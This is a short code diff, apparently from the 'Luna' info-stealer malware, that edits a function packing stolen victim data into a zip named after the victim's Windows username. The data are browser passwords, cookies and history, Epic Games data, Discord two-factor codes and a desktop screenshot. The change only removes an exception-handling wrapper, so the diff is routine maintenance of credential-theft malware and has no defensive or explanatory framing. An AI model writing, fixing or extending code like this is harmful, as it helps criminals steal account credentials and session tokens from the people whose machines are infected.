@@ -545,7 +545,6 @@ class mfa_codes():
 
 def zipup():
     with ZipFile(f'Luna-Logged-{os.getenv("Username")}.zip', 'w') as zipf:
-        try:
             zipf.write("browser-passwords.txt")
             zipf.write("browser-cookies.txt")
             zipf.write("browser-history.txt")
@@ -555,8 +554,6 @@ def zipup():
             zipf.write("epicgames-data.txt")
             zipf.write("discord-2fa-codes.txt")
             zipf.write("desktop-screenshot.png")
-        except Exception:
-            pass
 
 def cleanup():
     try:
